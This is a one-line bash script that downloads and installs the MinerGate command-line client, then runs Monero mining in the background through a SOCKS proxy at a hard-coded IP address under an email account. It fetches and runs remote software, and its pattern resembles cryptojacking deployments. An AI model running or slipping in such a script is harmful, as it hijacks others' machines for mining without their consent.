#!/bin/bash


apt-get update && apt-get -y install wget screen && wget https://minergate.com/download/deb-cli && dpkg -i deb-cli && minergate-cli -proxy socks://78.22.212.168:10200 -user sintraduciendo@gmail.com -xmr &
